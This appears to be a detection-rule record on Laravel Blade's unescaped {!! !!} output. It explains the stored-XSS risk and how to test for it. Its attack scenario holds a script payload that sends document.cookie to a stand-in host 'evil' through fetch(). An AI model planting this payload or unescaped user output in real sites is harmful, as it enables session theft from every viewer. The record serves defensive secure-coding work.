name: Laravel Blade Unescaped Output
attack_scenario: Attacker stores comment body = <script>fetch('//evil/'+document.cookie)</script>; {!! !!} renders it unescaped and the script runs for every viewer.
negative_test_hint: store a comment body of "<script>alert(1)</script>" and assert the rendered page escapes it as text rather than running the script

exemplar.explanation: Blade's {!! !!} prints its expression without HTML-escaping (unlike {{ }} which escapes via e()); feeding user-controlled data through it injects live markup. The reject_re excludes the common safe helpers (csrf_field, method_field, paginator->links, Html::/Form::, translation helpers). Use {{ }} for untrusted values, and only use {!! !!} for output you have sanitized.
